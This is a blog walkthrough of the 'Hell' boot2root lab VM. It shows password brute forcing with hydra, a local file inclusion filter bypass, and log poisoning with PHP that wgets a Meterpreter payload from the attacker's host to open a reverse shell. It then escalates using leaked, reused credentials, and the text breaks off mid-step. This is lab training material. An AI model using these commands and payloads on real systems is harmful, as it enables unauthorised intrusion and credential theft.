
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Hell Walkthrough - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="So, Peleus released a vulnerable VM on VulnHub, also known as a &ldquo;boot2root&rdquo;, called Hell. A lot of the techniques in this VM are known to &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Hell Walkthrough</h2>
	<div class="entry-content"><p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>

<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.</p>

<blockquote><p>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P</p><footer><strong>recrudesce (@recrudesce)</strong> <cite><a href='https://twitter.com/recrudesce/statuses/489505727887978496'>twitter.com/recrudesce/statuses/&hellip;</a></cite></footer></blockquote>


<!-- more -->


<hr />

<h2>Scoping the Joint</h2>

<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 19:39 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.103
</span><span class='line'>Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">996</span> closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>22/tcp  open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
</span><span class='line'>80/tcp  open  http
</span><span class='line'>111/tcp open  rpcbind
</span><span class='line'>666/tcp open  doom
</span><span class='line'><span class="p">|</span>_banner: Welcome to the Admin Panel
</span><span class='line'>MAC Address: 08:00:27:FF:3F:A0 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 5.20 seconds
</span></code></pre></td></tr></table></div></figure>


<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>

<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>

<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>

<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>

<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>

<hr />

<h2>Getting In</h2>

<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# cewl http://192.168.0.103/personal/ -d <span class="m">1</span> -m <span class="m">6</span> -w password_list.txt -v
</span><span class='line'>CeWL 5.0 Robin Wood <span class="o">(</span>robin@digininja.org<span class="o">)</span> <span class="o">(</span>www.digininja.org<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting at http://192.168.0.103/personal/
</span><span class='line'>Visiting: http://192.168.0.103/personal/, got response code 200
</span><span class='line'>Attribute text found:
</span><span class='line'>
</span><span class='line'>Words found
</span><span class='line'>
</span><span class='line'>root@pwk:~# john --wordlist<span class="o">=</span>password_list.txt --rules --stdout &gt; password_list-mutated.txt
</span><span class='line'>words: <span class="m">4251</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Thu Jul <span class="m">17</span> 20:08:13 2014<span class="o">)</span>  w/s: <span class="m">47233</span>  current: forever99
</span></code></pre></td></tr></table></div></figure>


<p>Now we have a password list, we can use hydra to brute force the login.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# hydra 192.168.0.103 http-form-post <span class="s2">&quot;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&quot;</span> -l jack -P password_list-mutated.txt -t <span class="m">20</span> -w <span class="m">1</span> -o hydra-http-post-attack.txt
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span><span class="m">2013</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for</span> legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>WARNING<span class="o">]</span> the waittime you <span class="nb">set </span>is low, this can result in errornous results
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-07-17 20:10:12
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> <span class="m">20</span> tasks, <span class="m">1</span> server, <span class="m">4251</span> login tries <span class="o">(</span>l:1/p:4251<span class="o">)</span>, ~212 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
</span><span class='line'><span class="o">[</span>80<span class="o">][</span>www-form<span class="o">]</span> host: 192.168.0.103   login: jack   password: g0tmi1k69
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-07-17 20:10:22
</span></code></pre></td></tr></table></div></figure>


<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>

<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>

<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>

<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>

<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>

<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.110 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> R &gt; sneaky.txt
</span></code></pre></td></tr></table></div></figure>


<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; use multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload php/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; php/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span></code></pre></td></tr></table></div></figure>


<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">&#39;wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2&gt;&amp;1&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>

<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>

<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>

<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">40551</span> bytes<span class="o">)</span> to 192.168.0.103
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:443 -&gt; 192.168.0.103:48153<span class="o">)</span> at 2014-07-17 21:55:37 +0100
</span><span class='line'>
</span><span class='line'>meterpreter &gt;
</span></code></pre></td></tr></table></div></figure>


<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>

<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">10279</span> created.
</span><span class='line'>Channel <span class="m">0</span> created.
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>BAM ! We&rsquo;ve just started the journey.</p>

<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>george:x:1000:1000:george,,,:/home/george:/bin/bash
</span><span class='line'>jack:x:1001:1001::/home/jack:/bin/sh
</span><span class='line'>milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
</span><span class='line'>developers:x:1003:1003::/home/developers:/bin/sh
</span><span class='line'>bazza:x:1004:1004::/home/bazza:/bin/sh
</span><span class='line'>oj:x:1005:1005::/home/oj:/bin/sh
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>

<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>

<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>grep password /var/www/super_secret_login_path_muhahaha/*
</span><span class='line'>index.php:&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>login.php:    <span class="nv">$password</span> <span class="o">=</span> mysql_escape_string<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>login.php:    // mysql_connect<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span>, <span class="s2">&quot;Jack&quot;</span>, <span class="s2">&quot;zgcR6mU6pX&quot;</span><span class="o">)</span> or die <span class="o">(</span><span class="s2">&quot;Server Error&quot;</span><span class="o">)</span><span class="p">;</span> I<span class="s1">&#39;ll change this back once development is done. Got sick of typing my password.</span>
</span><span class='line'><span class="s1">login.php:   $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;</span><span class="nv">$username</span><span class="s1">&#39; and password=&#39;</span><span class="nv">$password</span><span class="err">&#39;</span><span class="s2">&quot;;</span>
</span><span class='line'><span class="s2">personal.php:&lt;INPUT name=&quot;</span>password<span class="s2">&quot; id=&quot;</span>password<span class="s2">&quot; type=&quot;</span>password<span class="s2">&quot; value=&quot;</span><span class="err">&quot;</span>/&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su jack
</span><span class='line'>Password: zgcR6mU6pX
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>jack
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>

<hr />

<h2>Got Milk ? Want Any ?</h2>

<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>

<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>

<p>Yeah&hellip;
Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>

<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----BEGIN PGP MESSAGE-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
</span><span class='line'>=svWU
</span><span class='line'>-----END PGP MESSAGE-----
</span></code></pre></td></tr></table></div></figure>


<p>As suspected, Jack uses PGP on the local host, therefore his PGP keys are stored in /home/jack/.pgp, complete with a note giving us a password hint.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -l .pgp
</span><span class='line'>ls -l .pgp
</span><span class='line'>total 12
</span><span class='line'>-rwx------ <span class="m">1</span> jack jack   <span class="m">39</span> Jun <span class="m">18</span> 12:35 note
</span><span class='line'>-rwx------ <span class="m">1</span> jack jack <span class="m">1802</span> Jun <span class="m">18</span> 12:20 pgp.priv
</span><span class='line'>-rwx------ <span class="m">1</span> jack jack  <span class="m">890</span> Jun <span class="m">18</span> 12:24 pgp.pub
</span><span class='line'><span class="nv">$ </span>cat .pgp/note
</span><span class='line'>The usual password as with everything.
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can assume the password is either <strong>g0tmi1k69</strong> or <strong>zgcR6mU6pX</strong>. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack&rsquo;s PGP private key.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gpg --import .pgp/pgp.priv
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
</span><span class='line'>gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
</span><span class='line'>gpg: key 3F18AB0A: public key <span class="s2">&quot;jack@cowlovers.com&quot;</span> imported
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:               imported: <span class="m">1</span>  <span class="o">(</span>RSA: 1<span class="o">)</span>
</span><span class='line'>gpg:       secret keys <span class="nb">read</span>: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span><span class='line'><span class="nv">$ </span>gpg -o email.txt /var/mail/jack/received/message.eml
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key <span class="k">for</span>
</span><span class='line'>user: <span class="s2">&quot;jack@cowlovers.com&quot;</span>
</span><span class='line'>
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>
</span><span class='line'>Enter passphrase: g0tmi1k69
</span><span class='line'>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      <span class="s2">&quot;jack@cowlovers.com&quot;</span>
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'><span class="nv">$ </span>cat email.txt
